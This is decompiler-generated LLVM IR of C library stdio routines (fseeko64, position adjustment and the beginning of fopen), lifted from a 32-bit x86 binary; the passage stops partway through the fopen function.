define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8056820 = load i32, i32* @ebp, align 4
  %v0_8056821 = load i32, i32* @edi, align 4
  %v0_8056822 = load i32, i32* @esi, align 4
  %v0_8056823 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8056833 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056833, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_8056857, label %dec_label_pc_8056844

dec_label_pc_8056844:                             ; preds = %entry
  %v1_8056844 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8056844, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805684c = inttoptr i32 %v1_8056844 to i32*
  store i32 22, i32* %v1_805684c, align 4
  br label %dec_label_pc_80568f9

dec_label_pc_8056857:                             ; preds = %entry
  %v1_8056857 = add i32 %v4_8056833, 52
  %v2_8056857 = inttoptr i32 %v1_8056857 to i32*
  %v3_8056857 = load i32, i32* %v2_8056857, align 4
  %v1_805685a = icmp eq i32 %v3_8056857, 0
  %v1_805685c = icmp eq i1 %v1_805685a, false
  br i1 %v1_805685c, label %dec_label_pc_805687d, label %dec_label_pc_805685e

dec_label_pc_805685e:                             ; preds = %dec_label_pc_8056857
  %v1_805685e = add i32 %v4_8056833, 56
  store i32 %v1_805685e, i32* @ebx, align 4
  %v2_8056868 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056868, i32* @eax, align 4
  %v3_805686d = call i32 @__pthread_return_void(i32 %v2_8056868, i32 134564427)
  store i32 %v3_805686d, i32* %eax.global-to-local, align 4
  %v0_8056872 = load i32, i32* @ebx, align 4
  %v2_8056875 = call i32 @__pthread_return_0(i32 %v0_8056872)
  store i32 %v2_8056875, i32* %eax.global-to-local, align 4
  %v0_805687d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805687d

dec_label_pc_805687d:                             ; preds = %dec_label_pc_8056857, %dec_label_pc_805685e
  %v0_8056885 = phi i32 [ %v4_8056833, %dec_label_pc_8056857 ], [ %v0_805687d.pre, %dec_label_pc_805685e ]
  %v1_805687d = inttoptr i32 %v0_8056885 to i8*
  %v2_805687d = load i8, i8* %v1_805687d, align 1
  %v3_805687d = and i8 %v2_805687d, 64
  %v4_805687d = icmp eq i8 %v3_805687d, 0
  br i1 %v4_805687d, label %dec_label_pc_8056892, label %dec_label_pc_8056882

dec_label_pc_8056882:                             ; preds = %dec_label_pc_805687d
  %v2_8056886 = call i32 @__stdio_wcommit(i32 %v0_8056885)
  store i32 %v2_8056886, i32* %eax.global-to-local, align 4
  %v1_805688e = icmp eq i32 %v2_8056886, 0
  %v1_8056890 = icmp eq i1 %v1_805688e, false
  br i1 %v1_8056890, label %dec_label_pc_80568e1, label %dec_label_pc_8056892

dec_label_pc_8056892:                             ; preds = %dec_label_pc_8056882, %dec_label_pc_805687d
  %v0_8056892 = load i32, i32* @edi, align 4
  %v9_8056892 = icmp eq i32 %v0_8056892, 1
  %v1_8056895 = icmp eq i1 %v9_8056892, false
  br i1 %v1_8056895, label %dec_label_pc_8056892.dec_label_pc_80568ab_crit_edge, label %dec_label_pc_8056897

dec_label_pc_8056892.dec_label_pc_80568ab_crit_edge: ; preds = %dec_label_pc_8056892
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80568ab

dec_label_pc_8056897:                             ; preds = %dec_label_pc_8056892
  %v0_8056897 = load i32, i32* @ecx, align 4
  %v2_8056899 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8056899, i32* %eax.global-to-local, align 4
  %v0_805689e = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_805689e to i32*
  %v6_805689f = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8056899, i32 %v0_8056897, i32 %v0_8056897)
  store i32 %v6_805689f, i32* %eax.global-to-local, align 4
  %v2_80568a7 = icmp slt i32 %v6_805689f, 0
  br i1 %v2_80568a7, label %dec_label_pc_80568e1, label %dec_label_pc_8056897.dec_label_pc_80568ab_crit_edge

dec_label_pc_8056897.dec_label_pc_80568ab_crit_edge: ; preds = %dec_label_pc_8056897
  %v0_80568ac.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80568ab

dec_label_pc_80568ab:                             ; preds = %dec_label_pc_8056892.dec_label_pc_80568ab_crit_edge, %dec_label_pc_8056897.dec_label_pc_80568ab_crit_edge
  %v2_80568ad.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8056892.dec_label_pc_80568ab_crit_edge ], [ %v2_8056899, %dec_label_pc_8056897.dec_label_pc_80568ab_crit_edge ]
  %v0_80568ac = phi i32 [ %v0_8056892, %dec_label_pc_8056892.dec_label_pc_80568ab_crit_edge ], [ %v0_80568ac.pre, %dec_label_pc_8056897.dec_label_pc_80568ab_crit_edge ]
  %v0_80568ab = load i32, i32* @edx, align 4
  store i32 %v2_80568ad.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80568b2 = load i32, i32* @esi, align 4
  %v5_80568b3 = inttoptr i32 %v2_80568ad.pre-phi to i32*
  %v6_80568b3 = call i32 @__stdio_seek(i32 %v0_80568b2, i32* %v5_80568b3, i32 %v0_80568ac, i32 %v0_80568ab)
  store i32 %v6_80568b3, i32* %eax.global-to-local, align 4
  %v2_80568bb = icmp slt i32 %v6_80568b3, 0
  br i1 %v2_80568bb, label %dec_label_pc_80568e1, label %dec_label_pc_80568bf

dec_label_pc_80568bf:                             ; preds = %dec_label_pc_80568ab
  %v0_80568bf = load i32, i32* @esi, align 4
  %v1_80568bf = inttoptr i32 %v0_80568bf to i16*
  %v2_80568bf = load i16, i16* %v1_80568bf, align 2
  %v3_80568bf = and i16 %v2_80568bf, -72
  store i16 %v3_80568bf, i16* %v1_80568bf, align 2
  %v0_80568c3 = load i32, i32* @esi, align 4
  %v1_80568c3 = add i32 %v0_80568c3, 8
  %v2_80568c3 = inttoptr i32 %v1_80568c3 to i32*
  %v3_80568c3 = load i32, i32* %v2_80568c3, align 4
  store i32 %v3_80568c3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_80568c8 = add i32 %v0_80568c3, 16
  %v3_80568c8 = inttoptr i32 %v2_80568c8 to i32*
  store i32 %v3_80568c3, i32* %v3_80568c8, align 4
  %v0_80568cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80568cb = load i32, i32* @esi, align 4
  %v2_80568cb = add i32 %v1_80568cb, 20
  %v3_80568cb = inttoptr i32 %v2_80568cb to i32*
  store i32 %v0_80568cb, i32* %v3_80568cb, align 4
  %v0_80568ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80568ce = load i32, i32* @esi, align 4
  %v2_80568ce = add i32 %v1_80568ce, 24
  %v3_80568ce = inttoptr i32 %v2_80568ce to i32*
  store i32 %v0_80568ce, i32* %v3_80568ce, align 4
  %v0_80568d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80568d1 = load i32, i32* @esi, align 4
  %v2_80568d1 = add i32 %v1_80568d1, 28
  %v3_80568d1 = inttoptr i32 %v2_80568d1 to i32*
  store i32 %v0_80568d1, i32* %v3_80568d1, align 4
  %v0_80568d4 = load i32, i32* @esi, align 4
  %v1_80568d4 = add i32 %v0_80568d4, 44
  %v2_80568d4 = inttoptr i32 %v1_80568d4 to i32*
  store i32 0, i32* %v2_80568d4, align 4
  %v0_80568db = load i32, i32* @esi, align 4
  %v1_80568db = add i32 %v0_80568db, 2
  %v2_80568db = inttoptr i32 %v1_80568db to i8*
  store i8 0, i8* %v2_80568db, align 1
  br label %dec_label_pc_80568e4

dec_label_pc_80568e1:                             ; preds = %dec_label_pc_80568ab, %dec_label_pc_8056897, %dec_label_pc_8056882
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80568e4

dec_label_pc_80568e4:                             ; preds = %dec_label_pc_80568bf, %dec_label_pc_80568e1
  br i1 %v1_805685c, label %dec_label_pc_80568f9, label %dec_label_pc_80568e8

dec_label_pc_80568e8:                             ; preds = %dec_label_pc_80568e4
  %v2_80568ec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80568ec, i32* @eax, align 4
  %v3_80568f1 = call i32 @__pthread_return_void(i32 %v2_80568ec, i32 1)
  store i32 %v3_80568f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80568f9

dec_label_pc_80568f9:                             ; preds = %dec_label_pc_80568e4, %dec_label_pc_8056844, %dec_label_pc_80568e8
  %v0_80568fc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80568fc, i32* %eax.global-to-local, align 4
  store i32 %v0_8056823, i32* @ebx, align 4
  store i32 %v0_8056822, i32* @esi, align 4
  store i32 %v0_8056821, i32* @edi, align 4
  store i32 %v0_8056820, i32* @ebp, align 4
  ret i32 %v0_80568fc

; uselistorder directives
  uselistorder i32 %v2_80568ad.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8056892, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80568f9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80568e4, { 1, 0 }
  uselistorder label %dec_label_pc_80568ab, { 1, 0 }
  uselistorder label %dec_label_pc_805687d, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8056914 = load i32, i32* %arg1, align 4
  store i32 %v2_8056914, i32* %esi.global-to-local, align 4
  %v1_805691b = urem i32 %v2_8056914, 4
  %v2_805691b = icmp eq i32 %v1_805691b, 0
  store i32 %v1_805691b, i32* %ecx.global-to-local, align 4
  br i1 %v2_805691b, label %dec_label_pc_805694a, label %dec_label_pc_8056920

dec_label_pc_8056920:                             ; preds = %entry
  %v1_8056922 = add nsw i32 %v1_805691b, -1
  %v8_8056922 = icmp eq i32 %v1_8056922, 0
  store i32 %v1_8056922, i32* @edx, align 4
  br i1 %v8_8056922, label %dec_label_pc_805694a, label %dec_label_pc_8056925

dec_label_pc_8056925:                             ; preds = %dec_label_pc_8056920
  %v3_8056925 = and i32 %v2_8056914, 2048
  %v4_8056925 = icmp eq i32 %v3_8056925, 0
  br i1 %v4_8056925, label %dec_label_pc_805694a, label %dec_label_pc_805692a

dec_label_pc_805692a:                             ; preds = %dec_label_pc_8056925
  %v6_805692a = sub nsw i32 1, %v1_805691b
  %v7_805692a = and i32 %v1_8056922, %v6_805692a
  %v8_805692a = icmp slt i32 %v7_805692a, 0
  %v9_805692a = icmp eq i32 %v1_805691b, 2
  %v10_805692a = icmp ult i32 %v1_805691b, 2
  %v3_805692d = icmp eq i1 %v10_805692a, %v8_805692a
  %v4_805692d = icmp eq i1 %v9_805692a, false
  %v5_805692d = and i1 %v4_805692d, %v3_805692d
  br i1 %v5_805692d, label %dec_label_pc_80569a0, label %dec_label_pc_805692f

dec_label_pc_805692f:                             ; preds = %dec_label_pc_805692a
  %v1_805692f = add i32 %tmp6, 40
  %v2_805692f = inttoptr i32 %v1_805692f to i32*
  %v3_805692f = load i32, i32* %v2_805692f, align 4
  %v4_805692f = icmp eq i32 %v3_805692f, 0
  %v1_8056933 = icmp eq i1 %v4_805692f, false
  br i1 %v1_8056933, label %dec_label_pc_80569a0, label %dec_label_pc_8056935

dec_label_pc_8056935:                             ; preds = %dec_label_pc_805692f
  %v1_8056935 = add i32 %tmp6, 3
  %v2_8056935 = inttoptr i32 %v1_8056935 to i8*
  %v3_8056935 = load i8, i8* %v2_8056935, align 1
  %v4_8056935 = zext i8 %v3_8056935 to i32
  %v2_8056939 = sub nsw i32 %v1_8056922, %v4_8056935
  %v1_805693b = add i32 %tmp6, 44
  %v2_805693b = inttoptr i32 %v1_805693b to i32*
  %v3_805693b = load i32, i32* %v2_805693b, align 4
  %v1_805693f = add nsw i32 %v2_8056939, -1
  %tmp12 = icmp slt i32 %v3_805693b, 1
  br i1 %tmp12, label %dec_label_pc_805694a, label %dec_label_pc_8056944

dec_label_pc_8056944:                             ; preds = %dec_label_pc_8056935
  %v1_8056944 = add i32 %tmp6, 2
  %v2_8056944 = inttoptr i32 %v1_8056944 to i8*
  %v3_8056944 = load i8, i8* %v2_8056944, align 1
  %v4_8056944 = zext i8 %v3_8056944 to i32
  %v2_8056948 = sub nsw i32 %v1_805693f, %v4_8056944
  br label %dec_label_pc_805694a

dec_label_pc_805694a:                             ; preds = %dec_label_pc_8056935, %dec_label_pc_8056925, %dec_label_pc_8056920, %entry, %dec_label_pc_8056944
  %v0_8056961 = phi i32 [ %v1_805693f, %dec_label_pc_8056935 ], [ %v1_8056922, %dec_label_pc_8056925 ], [ 0, %dec_label_pc_8056920 ], [ 0, %entry ], [ %v2_8056948, %dec_label_pc_8056944 ]
  %v2_805694a = and i32 %v2_8056914, 64
  %v3_805694a = icmp eq i32 %v2_805694a, 0
  %storemerge.in.in.v = select i1 %v3_805694a, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056959 = add i32 %tmp6, 16
  %v3_8056959 = inttoptr i32 %v2_8056959 to i32*
  %v4_8056959 = load i32, i32* %v3_8056959, align 4
  %v5_8056959 = sub i32 %storemerge, %v4_8056959
  %v1_805695c = inttoptr i32 %arg2 to i32*
  %v2_805695c = load i32, i32* %v1_805695c, align 4
  store i32 %v2_805695c, i32* %ecx.global-to-local, align 4
  %v1_805695e = add i32 %arg2, 4
  %v2_805695e = inttoptr i32 %v1_805695e to i32*
  %v3_805695e = load i32, i32* %v2_805695e, align 4
  store i32 %v3_805695e, i32* %ebx.global-to-local, align 4
  %v2_8056961 = add i32 %v5_8056959, %v0_8056961
  store i32 %v2_8056961, i32* %esi.global-to-local, align 4
  %v2_805696c = ashr i32 %v2_8056961, 31
  %v5_8056975 = sub i32 %v2_805695c, %v2_8056961
  %v10_8056975 = icmp ult i32 %v2_805695c, %v2_8056961
  %v6_8056979 = zext i1 %v10_8056975 to i32
  %tmp = icmp slt i32 %v2_8056961, 0
  %v2_805696c.neg = zext i1 %tmp to i32
  %v7_8056979 = add i32 %v3_805695e, %v2_805696c.neg
  %v8_8056979 = add i32 %v7_8056979, %v6_8056979
  store i32 %v8_8056979, i32* @edx, align 4
  store i32 %v5_8056975, i32* %v1_805695c, align 4
  %v0_805697f = load i32, i32* @edx, align 4
  %v1_805697f = load i32, i32* %edi.global-to-local, align 4
  %v2_805697f = add i32 %v1_805697f, 4
  %v3_805697f = inttoptr i32 %v2_805697f to i32*
  store i32 %v0_805697f, i32* %v3_805697f, align 4
  %v0_8056982 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056982 = add i32 %v0_8056982, 4
  %v2_8056982 = inttoptr i32 %v1_8056982 to i32*
  %v3_8056982 = load i32, i32* %v2_8056982, align 4
  %v4_8056982 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8056985 = icmp slt i32 %v3_8056982, %v4_8056982
  br i1 %v5_8056985, label %dec_label_pc_805698f, label %dec_label_pc_8056987

dec_label_pc_8056987:                             ; preds = %dec_label_pc_805694a
  %v8_8056987 = icmp sgt i32 %v3_8056982, %v4_8056982
  br i1 %v8_8056987, label %dec_label_pc_805698d, label %dec_label_pc_8056989

dec_label_pc_8056989:                             ; preds = %dec_label_pc_8056987
  %v1_8056989 = inttoptr i32 %v0_8056982 to i32*
  %v2_8056989 = load i32, i32* %v1_8056989, align 4
  %v3_8056989 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8056989, %v3_8056989
  br i1 %tmp14, label %dec_label_pc_805698d, label %dec_label_pc_805698f

dec_label_pc_805698d:                             ; preds = %dec_label_pc_8056989, %dec_label_pc_8056987
  %v0_805698d = load i32, i32* %esi.global-to-local, align 4
  %v1_805698d = sub i32 0, %v0_805698d
  store i32 %v1_805698d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805698f

dec_label_pc_805698f:                             ; preds = %dec_label_pc_8056989, %dec_label_pc_805694a, %dec_label_pc_805698d
  %v0_805698f = load i32, i32* %esi.global-to-local, align 4
  %v2_805698f = icmp slt i32 %v0_805698f, 0
  %v1_8056991 = icmp eq i1 %v2_805698f, false
  br i1 %v1_8056991, label %dec_label_pc_80569a3, label %dec_label_pc_8056993

dec_label_pc_8056993:                             ; preds = %dec_label_pc_805698f
  %v1_8056993 = call i32 @__errno_location(i32 %v2_805696c)
  %v1_8056998 = inttoptr i32 %v1_8056993 to i32*
  store i32 75, i32* %v1_8056998, align 4
  %v0_80569a6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80569a3

dec_label_pc_80569a0:                             ; preds = %dec_label_pc_805692f, %dec_label_pc_805692a
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80569a3

dec_label_pc_80569a3:                             ; preds = %dec_label_pc_805698f, %dec_label_pc_8056993, %dec_label_pc_80569a0
  %v0_80569a6 = phi i32 [ %v0_805698f, %dec_label_pc_805698f ], [ %v0_80569a6.pre, %dec_label_pc_8056993 ], [ -1, %dec_label_pc_80569a0 ]
  ret i32 %v0_80569a6

; uselistorder directives
  uselistorder i32 %v4_8056982, { 1, 0 }
  uselistorder i32 %v3_8056982, { 1, 0 }
  uselistorder i32 %v1_8056922, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_805691b, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8056914, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 3, 2, 1, 0 }
  uselistorder i32 2048, { 4, 3, 8, 5, 7, 0, 1, 2, 10, 6, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80569a3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805698f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805694a, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80569ac = load i32, i32* @ebp, align 4
  %v0_80569ad = load i32, i32* @edi, align 4
  %v0_80569ae = load i32, i32* @esi, align 4
  %v0_80569af = load i32, i32* @ebx, align 4
  store i32 %v0_80569af, i32* %stack_var_-16, align 4
  %v4_80569b3 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80569b3, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80569c3 = load i8, i8* %arg2, align 1
  %v3_80569c3 = zext i8 %v2_80569c3 to i32
  %v4_80569c3 = load i32, i32* @eax, align 4
  %v5_80569c3 = and i32 %v4_80569c3, -256
  %v6_80569c3 = or i32 %v5_80569c3, %v3_80569c3
  store i32 %v6_80569c3, i32* %eax.global-to-local, align 4
  %v10_80569c5 = icmp eq i8 %v2_80569c3, 114
  br i1 %v10_80569c5, label %dec_label_pc_8056a07, label %dec_label_pc_80569c9

dec_label_pc_80569c9:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_80569ce = icmp eq i8 %v2_80569c3, 119
  br i1 %v10_80569ce, label %dec_label_pc_8056a09, label %dec_label_pc_80569d2

dec_label_pc_80569d2:                             ; preds = %dec_label_pc_80569c9
  store i32 1089, i32* @ebx, align 4
  %v10_80569d6 = icmp eq i8 %v2_80569c3, 97
  br i1 %v10_80569d6, label %dec_label_pc_8056a09, label %dec_label_pc_80569da

dec_label_pc_80569da:                             ; preds = %dec_label_pc_8056a82, %dec_label_pc_8056a5c, %dec_label_pc_80569d2
  %v0_80569da = load i32, i32* %stack_var_-16, align 4
  %v1_80569da = call i32 @__errno_location(i32 %v0_80569da)
  store i32 %v1_80569da, i32* %eax.global-to-local, align 4
  %v0_80569df = load i32, i32* @ebp, align 4
  %v1_80569df = icmp eq i32 %v0_80569df, 0
  %v1_80569e1 = inttoptr i32 %v1_80569da to i32*
  store i32 22, i32* %v1_80569e1, align 4
  br i1 %v1_80569df, label %dec_label_pc_8056bcf, label %dec_label_pc_80569ed

dec_label_pc_80569ed:                             ; preds = %dec_label_pc_8056aab, %dec_label_pc_80569da
  %v0_80569ed = load i32, i32* @ebp, align 4
  %v1_80569ed = add i32 %v0_80569ed, 1
  %v2_80569ed = inttoptr i32 %v1_80569ed to i8*
  %v3_80569ed = load i8, i8* %v2_80569ed, align 1
  %v4_80569ed = and i8 %v3_80569ed, 32
  %v5_80569ed = icmp eq i8 %v4_80569ed, 0
  br i1 %v5_80569ed, label %dec_label_pc_8056bcf, label %dec_label_pc_80569f7

dec_label_pc_80569f7:                             ; preds = %dec_label_pc_80569ed
  store i32 %v0_80569ed, i32* %stack_var_-76, align 4
  %v1_80569fb = call i32 @free(i32 %v0_80569ed)
  store i32 %v1_80569fb, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056bca

dec_label_pc_8056a07:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056a09

dec_label_pc_8056a09:                             ; preds = %dec_label_pc_80569d2, %dec_label_pc_80569c9, %dec_label_pc_8056a07
  %v0_8056a1a = phi i32 [ 1089, %dec_label_pc_80569d2 ], [ 577, %dec_label_pc_80569c9 ], [ 1, %dec_label_pc_8056a07 ]
  %v1_8056a09 = add i32 %v4_80569b3, 1
  store i32 %v1_8056a09, i32* %eax.global-to-local, align 4
  %v2_8056a0c = inttoptr i32 %v1_8056a09 to i8*
  %v3_8056a0c = load i8, i8* %v2_8056a0c, align 1
  %v12_8056a0c = icmp eq i8 %v3_8056a0c, 98
  br i1 %v12_8056a0c, label %dec_label_pc_8056a14, label %dec_label_pc_8056a12

dec_label_pc_8056a12:                             ; preds = %dec_label_pc_8056a09
  store i32 %v4_80569b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a14

dec_label_pc_8056a14:                             ; preds = %dec_label_pc_8056a09, %dec_label_pc_8056a12
  %v0_8056a14 = phi i32 [ %v1_8056a09, %dec_label_pc_8056a09 ], [ %v4_80569b3, %dec_label_pc_8056a12 ]
  %v1_8056a14 = add i32 %v0_8056a14, 1
  %v2_8056a14 = inttoptr i32 %v1_8056a14 to i8*
  %v3_8056a14 = load i8, i8* %v2_8056a14, align 1
  %v12_8056a14 = icmp eq i8 %v3_8056a14, 43
  %v1_8056a18 = icmp eq i1 %v12_8056a14, false
  br i1 %v1_8056a18, label %dec_label_pc_8056a22, label %dec_label_pc_8056a1a

dec_label_pc_8056a1a:                             ; preds = %dec_label_pc_8056a14
  store i32 %v0_8056a1a, i32* %eax.global-to-local, align 4
  %v1_8056a1f = add nuw nsw i32 %v0_8056a1a, 1
  store i32 %v1_8056a1f, i32* @ebx, align 4
  br label %dec_label_pc_8056a22

dec_label_pc_8056a22:                             ; preds = %dec_label_pc_8056a14, %dec_label_pc_8056a1a
  %v1_8056a22 = icmp eq i32 %arg3, 0
  %v1_8056a24 = icmp eq i1 %v1_8056a22, false
  br i1 %v1_8056a24, label %dec_label_pc_8056a58, label %dec_label_pc_8056a26

dec_label_pc_8056a26:                             ; preds = %dec_label_pc_8056a22
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8056a2b = call i32 @malloc(i32 80)
  store i32 %v1_8056a2b, i32* %eax.global-to-local, align 4
  store i32 %v1_8056a2b, i32* @ebp, align 4
  %v2_8056a35 = icmp eq i32 %v1_8056a2b, 0
  br i1 %v2_8056a35, label %dec_label_pc_8056bd1, label %dec_label_pc_8056a3d

dec_label_pc_8056a3d:                             ; preds = %dec_label_pc_8056a26
  %v2_8056a2b = inttoptr i32 %v1_8056a2b to i16*
  store i16 8192, i16* %v2_8056a2b, align 2
  %v2_8056a45 = add i32 %v1_8056a2b, 8
  %v3_8056a45 = inttoptr i32 %v2_8056a45 to i32*
  store i32 0, i32* %v3_8056a45, align 4
  %v2_8056a4c = add i32 %v1_8056a2b, 56
  store i32 %v2_8056a4c, i32* %eax.global-to-local, align 4
  store i32 %v2_8056a4c, i32* %stack_var_-76, align 4
  %v1_8056a50 = call i32 @__stdio_init_mutex(i32 %v2_8056a4c)
  store i32 %v1_8056a50, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a58

dec_label_pc_8056a58:                             ; preds = %dec_label_pc_8056a22, %dec_label_pc_8056a3d
  %v2_8056a58 = icmp slt i32 %arg4, 0
  br i1 %v2_8056a58, label %dec_label_pc_8056aa5, label %dec_label_pc_8056a5c

dec_label_pc_8056a5c:                             ; preds = %dec_label_pc_8056a58
  %v0_8056a5c = load i32, i32* @ebx, align 4
  %v0_8056a5e = load i32, i32* @esi, align 4
  %v1_8056a5e = add i32 %v0_8056a5e, 1
  store i32 %v1_8056a5e, i32* %eax.global-to-local, align 4
  %v1_8056a61 = and i32 %v0_8056a5c, 32771
  store i32 %v1_8056a61, i32* %edx.global-to-local, align 4
  %v1_8056a67 = load i32, i32* @ebp, align 4
  %v2_8056a67 = add i32 %v1_8056a67, 4
  %v3_8056a67 = inttoptr i32 %v2_8056a67 to i32*
  store i32 %arg4, i32* %v3_8056a67, align 4
  %v0_8056a6a = load i32, i32* %edx.global-to-local, align 4
  %v1_8056a6a = add i32 %v0_8056a6a, 1
  store i32 %v1_8056a6a, i32* @edx, align 4
  %v0_8056a6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a6b = and i32 %v0_8056a6b, %v1_8056a6a
  store i32 %v2_8056a6b, i32* %eax.global-to-local, align 4
  %v12_8056a6d = icmp eq i32 %v2_8056a6b, %v1_8056a6a
  %v1_8056a6f = icmp eq i1 %v12_8056a6d, false
  br i1 %v1_8056a6f, label %dec_label_pc_80569da, label %dec_label_pc_8056a75

dec_label_pc_8056a75:                             ; preds = %dec_label_pc_8056a5c
  %v0_8056a75 = load i32, i32* @esi, align 4
  %v1_8056a77 = and i32 %v0_8056a75, 1024
  %v1_8056a79 = xor i32 %v1_8056a77, 1024
  store i32 %v1_8056a79, i32* %eax.global-to-local, align 4
  %v1_8056a7e = load i32, i32* @ebx, align 4
  %v2_8056a7e = and i32 %v1_8056a7e, %v1_8056a79
  %v3_8056a7e = icmp eq i32 %v2_8056a7e, 0
  br i1 %v3_8056a7e, label %dec_label_pc_8056a75.dec_label_pc_8056a9b_crit_edge, label %dec_label_pc_8056a82

dec_label_pc_8056a75.dec_label_pc_8056a9b_crit_edge: ; preds = %dec_label_pc_8056a75
  br label %dec_label_pc_8056a9b

dec_label_pc_8056a82:                             ; preds = %dec_label_pc_8056a75
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8056a8b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8056a8b, i32* %eax.global-to-local, align 4
  %v1_8056a93 = icmp eq i32 %v3_8056a8b, 0
  %v1_8056a95 = icmp eq i1 %v1_8056a93, false
  br i1 %v1_8056a95, label %dec_label_pc_80569da, label %dec_label_pc_8056a82.dec_label_pc_8056a9b_crit_edge

dec_label_pc_8056a82.dec_label_pc_8056a9b_crit_edge: ; preds = %dec_label_pc_8056a82
  %v0_8056a9b.pre = load i32, i32* @esi, align 4
  %v0_8056aa1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056a9b

dec_label_pc_8056a9b:                             ; preds = %dec_label_pc_8056a75.dec_label_pc_8056a9b_crit_edge, %dec_label_pc_8056a82.dec_label_pc_8056a9b_crit_edge
  %v0_8056aa1 = phi i32 [ %v1_8056a7e, %dec_label_pc_8056a75.dec_label_pc_8056a9b_crit_edge ], [ %v0_8056aa1.pre, %dec_label_pc_8056a82.dec_label_pc_8056a9b_crit_edge ]
  %v0_8056a9b = phi i32 [ %v0_8056a75, %dec_label_pc_8056a75.dec_label_pc_8056a9b_crit_edge ], [ %v0_8056a9b.pre, %dec_label_pc_8056a82.dec_label_pc_8056a9b_crit_edge ]
  %v1_8056a9b = and i32 %v0_8056a9b, 32768
  %v2_8056aa1 = or i32 %v1_8056a9b, %v0_8056aa1
  store i32 %v2_8056aa1, i32* @ebx, align 4
  br label %dec_label_pc_8056ac6

dec_label_pc_8056aa5:                             ; preds = %dec_label_pc_8056a58
  %v1_8056aa5 = add i32 %arg4, 1
  %v8_8056aa5 = icmp eq i32 %v1_8056aa5, 0
  store i32 %v1_8056aa5, i32* @edi, align 4
